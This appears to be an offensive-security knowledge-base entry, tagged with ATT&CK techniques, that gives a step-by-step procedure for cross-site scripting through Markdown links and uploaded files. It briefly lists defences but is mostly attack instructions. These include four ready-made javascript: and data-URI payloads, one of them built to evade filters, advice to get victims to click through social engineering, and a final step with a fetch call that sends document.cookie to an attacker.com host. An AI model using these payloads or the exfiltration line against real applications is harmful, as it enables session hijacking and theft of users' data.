---
id: 3a6c80bc-b345-428e-a0af-90e313f3dc78
name: XSS-Injection-via-Files-and-Markdown
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:42.080059+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Collection|TA0009 - Collection]]'
techniques:
  - '[[techniques/JavaScript|T1059.007 - JavaScript]]'
  - '[[techniques/User-Execution|T1204 - User Execution]]'
sub_techniques: []
tags:
  - '[[tags/Cross-Site-Scripting]]'
  - '[[tags/XSS]]'
  - '[[tags/Markdown-Injection]]'
  - '[[tags/File-Injection]]'
commands: []
platforms:
  - Web
tools: []
validated: true
---

# XSS-Injection-via-Files-and-Markdown

## Summary

This procedure demonstrates how to inject Cross-Site Scripting (XSS) payloads into files or Markdown content that is rendered by a web application, allowing execution of malicious JavaScript in the victim's browser to steal sensitive data like cookies or session tokens.

## Description

XSS in files and Markdown exploits insufficient sanitization in web applications that allow user-uploaded files or Markdown input to be rendered as HTML. By crafting payloads that appear as benign Markdown links but execute JavaScript via protocols like 'javascript:' or data URIs, an attacker can bypass filters and run code in the context of the victim's session. This is particularly effective against platforms like content management systems, wikis, or file-sharing services where Markdown is parsed to HTML. The attack leads to data exfiltration, session hijacking, or further exploitation like keylogging. Prerequisites include a vulnerable input field for file uploads or Markdown editing without proper escaping of link protocols.

## Requirements

1. Access to a web application vulnerable to file uploads or Markdown input without sanitization of link protocols.
2. Knowledge of the target's rendering behavior (e.g., Markdown to HTML conversion).
3. A way to view or trigger the rendering of the injected content (e.g., via another user's browser).
4. Optional: Proxy tool like Burp Suite for testing payloads.

## Defense

- Implement strict input validation and output encoding, escaping special characters in Markdown links.
- Use Content Security Policy (CSP) headers to block inline scripts and 'javascript:' protocols (e.g., script-src 'self').
- Sanitize file uploads by processing Markdown with a secure parser that strips dangerous protocols.
- Employ Web Application Firewalls (WAFs) to detect and block common XSS patterns like base64 data URIs.

## Objectives

1. Inject malicious payloads into files or Markdown fields.
2. Achieve JavaScript execution in the victim's browser upon rendering.
3. Exfiltrate sensitive data such as document.cookie or perform actions on behalf of the user.

## Instructions

### Step 1: Identify Vulnerable Input Point

**Context**: Locate fields or endpoints in the web application where files can be uploaded or Markdown content can be submitted, such as profile bios, comments, or document editors. Test if the output renders Markdown links as clickable HTML without stripping protocols.

Use browser developer tools to inspect the rendered HTML and confirm if injected links execute on click.

### Step 2: Craft and Inject XSS Payload

**Context**: Select and modify payloads to evade any basic filters, then submit them via the vulnerable input. These payloads masquerade as Markdown links ([text](url)) but use executable URLs.

**Code** ([[codes/Markdown-Link-XSS-Payloads]]):

```javascript
[a](javascript:prompt(document.cookie))
[a](j a v a s c r i p t:prompt(document.cookie))
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
[a](javascript:window.onerror=alert;throw%201)
```

> The first payload directly uses the javascript: protocol to prompt the victim's cookies. The second inserts spaces to bypass keyword filters. The third embeds a base64-encoded script via data: URI to alert 'XSS'. The fourth triggers an onerror event to execute code. Submit one of these in a Markdown field or file (e.g., .md upload) and save. Expected: The link renders harmlessly but executes JS on click.

### Step 3: Trigger Execution and Verify

**Context**: Have a victim (or use social engineering) interact with the rendered content by clicking the link, or automate via onload if possible. Monitor for execution to confirm success.

Open the page containing the injected content in a test browser. Click the link and observe if the prompt or alert fires, displaying cookies or 'XSS'.

**Expected Output**: A browser dialog (prompt/alert) showing stolen data like session cookies, or network requests to an attacker-controlled server if exfiltration is added (e.g., modify payload to send to attacker's endpoint).

### Step 4: Exfiltrate Data

**Context**: Once execution is confirmed, adapt the payload to send data to an attacker server, such as replacing prompt() with an XMLHttpRequest to a C2 endpoint.

Modify the payload accordingly and reinject. For example, change to: [a](javascript:fetch('http://attacker.com?cookie='+document.cookie)).

**Expected Output**: Data received on attacker's server, confirming compromise.
